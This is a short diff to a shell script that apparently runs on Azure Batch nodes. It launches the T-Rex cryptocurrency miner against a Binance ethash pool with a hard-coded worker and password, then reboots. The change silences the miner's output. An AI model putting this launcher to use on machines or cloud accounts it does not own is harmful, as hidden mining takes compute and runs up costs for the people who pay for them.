@@ -34,6 +34,6 @@ else
     tar -xzvf /home/_azbatch/trex/t-rex-0.20.4-linux.tar.gz &&
     cd /home/_azbatch/trex &&
     hostname=$(hostname | cut -c1-8) &&
-     /home/_azbatch/trex/t-rex --algo ethash --url stratum+tcp://ethash.poolbinance.com:443 --user datad.001 --worker datad.001 --pass 123456 --cpu-priority 5 --api-bind-http 0 --api-bind-telnet 0 --retries 90 --retry-pause 30 ;
+     /home/_azbatch/trex/t-rex --algo ethash --url stratum+tcp://ethash.poolbinance.com:443 --user datad.001 --worker datad.001 --pass 123456 --cpu-priority 5 --api-bind-http 0 --api-bind-telnet 0 --retries 90 --retry-pause 30  > /dev/null 2>&1 
     sudo reboot
 fi
